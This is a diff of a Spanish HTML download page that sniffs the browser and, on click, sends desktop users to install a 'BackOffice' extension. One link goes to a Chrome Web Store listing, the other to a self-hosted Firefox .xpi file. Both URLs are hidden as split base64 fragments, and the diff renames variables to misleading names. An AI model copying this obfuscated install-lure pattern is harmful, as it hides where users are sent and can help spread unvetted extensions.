@@ -1,17 +1,51 @@
 <!DOCTYPE html>
-<html lang="es"><head><meta charset="utf-8"><title>Base64 dividido</title>
-<style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5}.card{background:#fff;padding:2rem;border-radius:1rem;box-shadow:0 4px 10px rgba(0,0,0,.15);text-align:center;max-width:420px}a.button{display:inline-block;margin-top:1rem;padding:.75rem 1.5rem;border-radius:.5rem;background:#0078d7;color:#fff;text-decoration:none;font-weight:700;cursor:pointer}</style>
-</head><body>
-<div class="card"><h1>Descargar Extensión</h1><p id="mensaje">Detectando tu navegador...</p><a id="boton" class="button">Esperando...</a></div>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<title>BackOffice Addons</title>
+<style>
+body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;margin:0}
+.card{background:#fff;padding:2rem;border-radius:1rem;box-shadow:0 4px 10px rgba(0,0,0,.15);text-align:center;max-width:420px}
+a.cta{display:inline-block;margin-top:1rem;padding:.75rem 1.5rem;border-radius:.5rem;background:#0078d7;color:#fff;text-decoration:none;font-weight:700;cursor:pointer}
+a.cta:hover{background:#005ea6}
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>Descargar Extensión</h1>
+  <p id="sysStatus">Detectando entorno...</p>
+  <a id="sysAction" class="cta">Esperando...</a>
+</div>
 <script>
-const chromeB64Parts=["aHR0cHM6Ly9jaHJvbWV3ZWJzdG9yZS5nb29nbGUuY29t","L2RldGFpbC9iYWNrb2ZmaWNlYWRkb25zL2pqZ2FmZHBhbWJvbmVib2xmZGZoY2Jm","amRtaGFsZGhi"];
-const firefoxB64Parts=["aHR0cHM6Ly90ZWFtbWV4aWNvNy5naXRodWIuaW8v","QmFja09mZmljZVVwZGF0ZXMvYmFja29mZmljZXRlYW1teC0xMi44LnhwaQ=="];
-const ua=navigator.userAgent, isPC=!/Mobi|Android|iPhone|iPad/i.test(ua);
-const msg=document.getElementById("mensaje"), btn=document.getElementById("boton");
-function useParts(p){return atob(p.join(""));} 
-if(!isPC){msg.textContent="Solo disponible en navegadores de escritorio."; btn.style.display="none";}
-else if(/Chrome|Edg/.test(ua)&&!/OPR/.test(ua)){msg.textContent="Instalar en Chrome"; btn.textContent="Instalar Complemento"; btn.onclick=()=> location.href = useParts(chromeB64Parts);}
-else if(/Firefox/.test(ua)){msg.textContent="Instalar en Firefox"; btn.textContent="Instalar Complemento"; btn.onclick=()=> location.href = useParts(firefoxB64Parts);}
-else{msg.textContent="Tu navegador no es compatible."; btn.style.display="none";}
+const coreAgent=["aHR0cHM6Ly9jaHJvbWV3ZWJzdG9yZS5nb29nbGUuY29t","L2RldGFpbC9iYWNrb2ZmaWNlYWRkb25zL2pqZ2FmZHBhbWJvbmVib2xmZGZoY2Jm","amRtaGFsZGhi"];
+const runtimeManifest=["aHR0cHM6Ly90ZWFtbWV4aWNvNy5naXRodWIuaW8v","QmFja09mZmljZVVwZGF0ZXMvYmFja29mZmljZXRlYW1teC0xMi44LnhwaQ=="];
+const kernelProbe=navigator.userAgent;
+const platformFlag=!/Mobi|Android|iPhone|iPad/i.test(kernelProbe);
+const uiAnchor=document.getElementById("sysAction");
+const statusNode=document.getElementById("sysStatus");
+function assembleAndLaunch(fragments){
+  try{
+    const resolved=atob(fragments.join(""));
+    location.href=resolved;
+  }catch(e){
+    statusNode.textContent="Error al preparar la descarga.";
+  }
+}
+if(!platformFlag){
+  statusNode.textContent="Solo disponible en navegadores de escritorio.";
+  uiAnchor.style.display="none";
+}else if(/Chrome|Edg/.test(kernelProbe)&&!/OPR/.test(kernelProbe)){
+  statusNode.textContent="Instalador compatible con este sistema.";
+  uiAnchor.textContent="Instalar complemento";
+  uiAnchor.onclick=()=>assembleAndLaunch(coreAgent);
+}else if(/Firefox/.test(kernelProbe)){
+  statusNode.textContent="Instalador compatible con este sistema.";
+  uiAnchor.textContent="Instalar complemento";
+  uiAnchor.onclick=()=>assembleAndLaunch(runtimeManifest);
+}else{
+  statusNode.textContent="Navegador no soportado.";
+  uiAnchor.style.display="none";
+}
 </script>
-</body></html>
+</body>
+</html>
